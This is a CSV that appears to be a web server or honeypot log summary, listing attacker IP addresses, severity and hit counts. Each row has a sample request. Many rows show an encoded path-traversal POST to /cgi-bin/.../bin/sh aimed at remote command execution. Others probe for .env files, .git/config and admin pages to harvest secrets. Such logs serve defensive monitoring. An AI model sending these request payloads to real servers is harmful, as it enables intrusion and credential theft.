IP,SEVERITY,COUNT,SAMPLE_PAYLOAD
35.216.189.16,HIGH,6,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03I*\xFFr\xC7+><\xBE\xC9\x83\xC6&\xE2%\x05\xC6\x8Ca\x05\x1"
47.85.49.48,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
81.163.30.15,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.234.32.26,HIGH,6,"GET /.env.development%20 HTTP/1.1"
173.239.240.77,HIGH,6,"GET /.env.development%20 HTTP/1.1"
213.199.46.10,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
217.77.8.180,HIGH,6,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
84.200.154.218,HIGH,6,"GET /.env HTTP/1.1"
45.119.212.42,HIGH,6,"GET /public/.env HTTP/1.1"
157.245.53.22,HIGH,5,"GET /.env HTTP/1.1"
45.154.98.220,HIGH,5,"GET /.env HTTP/1.1"
62.171.164.240,HIGH,5,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.234.32.28,HIGH,5,"POST /.env HTTP/1.1"
173.239.240.65,HIGH,5,"GET /.env.old HTTP/1.1"
173.239.240.84,HIGH,5,"GET /application/.env HTTP/1.1"
86.48.30.152,HIGH,5,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
103.40.61.98,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.236.9.62,HIGH,4,"GET /.env HTTP/1.1"
185.195.233.176,HIGH,4,"GET /.git/config HTTP/1.1"
193.5.44.36,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
80.82.77.202,HIGH,4,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xDA\xCB M\xC4Q\x97\x86\x1B\x06\xBE\x84)M\xAF\x11\xD4K\x"
89.117.61.19,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
103.103.21.109,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
103.148.195.198,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
104.234.32.33,HIGH,4,"GET /application/.env HTTP/1.1"
173.212.216.158,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
173.239.240.63,HIGH,4,"GET /index.php?p=admin/dashboard HTTP/1.1"
173.239.240.69,HIGH,4,"GET /shared/.env%20 HTTP/1.1"
173.239.240.71,HIGH,4,"GET /rest/.env HTTP/1.1"
45.78.235.69,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
66.116.205.19,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
66.248.205.66,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
67.213.118.179,HIGH,4,"GET /.env HTTP/1.1"
77.83.39.218,HIGH,4,"GET /.git/config HTTP/1.1"
94.26.88.31,HIGH,4,"GET /.env HTTP/1.1"
185.177.72.68,HIGH,4,"GET /.env.sample HTTP/1.1"
218.33.108.122,HIGH,4,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
102.244.97.186,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
115.190.29.141,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
123.233.245.135,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
13.79.87.25,HIGH,3,"GET /admins.php HTTP/1.1"
164.92.106.138,HIGH,3,"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
172.105.128.13,HIGH,3,"\x16\x03\x01\x01"
